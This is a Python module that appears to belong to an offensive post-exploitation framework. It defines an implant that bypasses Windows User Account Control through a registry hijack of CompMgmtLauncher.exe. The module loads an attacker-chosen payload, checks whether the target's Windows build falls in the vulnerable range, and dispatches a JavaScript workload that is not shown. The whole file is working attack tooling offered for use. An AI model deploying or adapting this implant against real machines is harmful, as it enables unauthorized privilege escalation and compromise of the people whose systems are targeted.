import core.job
import core.implant
import uuid

class CompMgmtLauncherJob(core.job.Job):
    def create(self):
        id = self.options.get("PAYLOAD")
        payload = self.load_payload(id)
        self.options.set("PAYLOAD_DATA", payload)
        if self.session_id == -1:
            return
        if (int(self.session.build) < 7600 or int(self.session.build) > 15030) and self.options.get("IGNOREBUILD") == "false":
            self.error("0", "The target may not be vulnerable to this implant. Set IGNOREBUILD to true to run anyway.", "Target build not vuln", "")
            return False

    def done(self):
        self.display()

    def display(self):
        self.results = "Completed"
        #self.shell.print_plain(self.data)

class CompMgmtLauncherImplant(core.implant.Implant):

    NAME = "Bypass UAC CompMgmtLauncher"
    DESCRIPTION = "Bypass UAC via registry hijack for CompMgmtLauncher.exe. Drops no files to disk."
    AUTHORS = ["TheNaterz", "enigma0x3"]
    STATE = "implant/elevate/bypassuac_compmgmtlauncher"

    def load(self):
        self.options.register("PAYLOAD", "", "run listeners for a list of IDs")
        self.options.register("PAYLOAD_DATA", "", "the actual data", hidden=True)

    def job(self):
        return CompMgmtLauncherJob

    def run(self):
        id = self.options.get("PAYLOAD")
        payload = self.load_payload(id)

        if payload is None:
            self.shell.print_error("Payload %s not found." % id)
            return False

        workloads = {}
        workloads["js"] = "data/implant/elevate/bypassuac_compmgmtlauncher.js"

        self.dispatch(workloads, self.job)
